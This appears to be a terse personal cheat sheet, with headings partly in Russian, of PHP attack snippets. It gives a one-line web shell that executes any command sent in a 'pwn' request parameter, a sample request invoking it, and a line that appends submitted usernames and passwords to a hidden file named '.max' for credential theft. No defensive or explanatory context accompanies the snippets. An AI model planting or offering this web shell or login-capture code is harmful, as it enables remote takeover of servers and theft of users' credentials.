# PHP

# CMD
  <?php system($_REQUEST['pwn']); ?>

  inddex.php?pwn=ls

# Запись в файл переменных

file_put_contents(".max", $_POST['log'] . ":" . $_POST['pwd'] . "\n" , FILE_APPEND);
